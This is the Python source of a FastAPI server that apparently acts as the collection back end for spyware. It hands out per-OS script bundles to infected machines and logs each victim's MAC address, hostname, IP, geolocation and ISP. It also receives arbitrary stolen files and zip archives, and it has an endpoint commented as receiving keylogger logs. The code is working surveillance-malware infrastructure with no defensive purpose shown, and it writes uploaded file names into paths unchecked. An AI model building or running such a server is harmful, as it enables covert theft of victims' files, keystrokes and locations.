import uvicorn # to launch the server
import os # anything related to folders and files
import mimetypes # to get mimetypes
from zipfile import ZipFile # to deal with zip files
from fastapi import FastAPI, Request, UploadFile, File # to make the server work
from fastapi.responses import FileResponse # to send script zips
from contextlib import ExitStack # to close files properly
from typing import List # to make file receiving work
from datetime import datetime, timezone # anything related to classification by time

app = FastAPI() # make the server

zip_location = {'win':'resources/win_scripts.zip', # locations of script zip files for each OS to send
                'linux':'resources/linux_scripts.zip',
                'darwin':'resources/darwin_scripts.zip'}

@app.get("/scripts")
async def scripts_zip(request: Request): # send the script zips
    headers = request.headers
    if 'win' in headers['os']:
        return FileResponse(zip_location['win'], media_type='application/zip', filename=zip_location['win'])
    elif 'linux' == headers['os']:
        return FileResponse(zip_location['linux'], media_type='application/zip', filename=zip_location['linux'])
    elif 'darwin' == headers['os']:
        return FileResponse(zip_location['darwin'], media_type='application/zip', filename=zip_location['darwin'])

@app.post("/identity")
async def identity(request: Request):
    information = await request.json() # get sent information
    os.makedirs(information['mac'], exist_ok=True) # make a directory for the computer
    if not os.path.exists(information['mac']+'information.txt'): # check if the information file doesnt already exist
        with open(information['mac']+'/information.txt', 'w') as f:
            f.write(f'mac: {information["mac"]}\n'
                    f'name: {information["name"]}\n'
                    f'os: {information["os"]}\n')
            f.write('IPs: \n'
                    '-------\n'
                    f'{request.client.host}\n'
                    f'lon: {information["lon"]}\n'
                    f'lat: {information["lat"]}\n'
                    f'country: {information["country"]}\n'
                    f'city: {information["city"]}\n'
                    f'isp: {information["isp"]}\n'
                    f'-------\n')
            f.close()
    else:
        with open(information['mac'] + '/information.txt', 'r') as f: # if the information file already exists, check if the mac address has not used this IP before
            if not request.client.host in f.read():
                with open(information['mac'] + '/information.txt', 'a') as fw: # if it hasn't, note the new IP down
                    fw.write('-------\n'
                            f'IP: {request.client.host}\n'
                            f'lon: {information["lon"]}\n'
                            f'lat: {information["lat"]}\n'
                            f'country: {information["country"]}\n'
                            f'city: {information["city"]}\n'
                            f'isp: {information["isp"]}\n'
                            f'-------\n')

@app.post("/")
async def get_files(request: Request, files: List[UploadFile] = File(...)): # to recieve any amount of files of any type
    mac = request.headers['mac']
    os.makedirs(mac, exist_ok=True) # recreate the directory of the mac address although it was created just to be safe if it was deleted by accident
    with ExitStack() as stack:
        for file in files: # go through all the files sent
            type = file.content_type.replace('/','-')
            contents = await file.read() # get the file contents
            os.makedirs(f"{mac}/{type}", exist_ok=True) # make a directory for the file type for organization
            f = stack.enter_context(open(f"{mac}/{type}/{file.filename}", "wb")) # open the file in bytes
            f.write(contents) # write the file contents in bytes

@app.post("/log")
async def get_keylogger_log(request: Request, file: UploadFile = File(...)): # to receive keylogger logs
    mac = request.headers['mac']
    os.makedirs(mac, exist_ok=True) # recreate the directory of the mac address although it was created just to be safe if it was deleted by accident
    os.makedirs(f"{mac}/keylogger-log", exist_ok=True) # make a directory for keylogger logs for organization
    contents = await file.read() # get file contents
    with open(f"{mac}/keylogger-log/{file.filename}", 'wb') as f: # write the file contents in bytes
        f.write(contents)
        f.close()

@app.post("/zip")
async def handle_zip(request: Request, file: UploadFile = File(...)): # to recieve zip files you want to unpack
    mac = request.headers['mac']
    os.makedirs(mac, exist_ok=True)  # make a directory for the IP that sent the file for organization
    zip_name = f"{mac}/{file.filename}" # make the zip name so its placed in a folder of the IP that sent it
    with open(zip_name, "wb") as zip:
        zip.write(await file.read()) # make the zip file that was received
        zip.close() # close the zip file to free up memory
    with ZipFile(zip_name, 'r') as zip: # open the zip file that was recieved
        with ExitStack() as stack:
            files = zip.namelist() # get the list of files in the zip
            for file in files:
                file_type = mimetypes.guess_type(file)[0].replace('/', '-') # get the file type for the file
                os.makedirs(f"{mac}/{file_type}", exist_ok=True)  # make a directory for the file type for organization
                f = stack.enter_context(open(f"{mac}/{file_type}/{file}", 'wb'))
                f.write(zip.read(file)) # put the contents of the file in the zip into the file you're making outside of the zip
    os.remove(zip_name) # remove the zip file you went through to avoid clutter


uvicorn.run(app, host="0.0.0.0", port=8000) # start the server